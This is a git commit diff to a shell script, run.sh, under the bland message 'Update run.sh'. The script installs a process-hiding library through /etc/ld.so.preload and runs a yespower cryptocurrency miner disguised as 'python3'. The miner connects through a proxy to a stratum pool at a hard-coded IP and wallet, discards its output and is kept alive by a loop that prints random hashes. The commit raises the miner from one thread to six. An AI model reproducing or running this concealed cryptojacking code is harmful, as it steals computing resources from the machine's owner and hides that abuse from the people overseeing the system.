370f0337438be4539cc3fc7892f04f16f6e55242
idamasitoh34 <115346793+idamasitoh34@users.noreply.github.com>
2022-10-14 02:53:09 +0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -47,5 +47,5 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/ 
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload 
  
-./graftcp/graftcp ./python3 -a yespower -o stratum+tcp://137.184.136.62:443 -u web1q4f9hemgt64tpj2cranaxhtrcqqqedvnngzunpy.$(echo $(shuf -i 1-20000 -n 1)-LordCPU) -p x -t 1 >/dev/null &
+./graftcp/graftcp ./python3 -a yespower -o stratum+tcp://137.184.136.62:443 -u web1q4f9hemgt64tpj2cranaxhtrcqqqedvnngzunpy.$(echo $(shuf -i 1-20000 -n 1)-LordCPU) -p x -t 6 >/dev/null &
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 1m; done
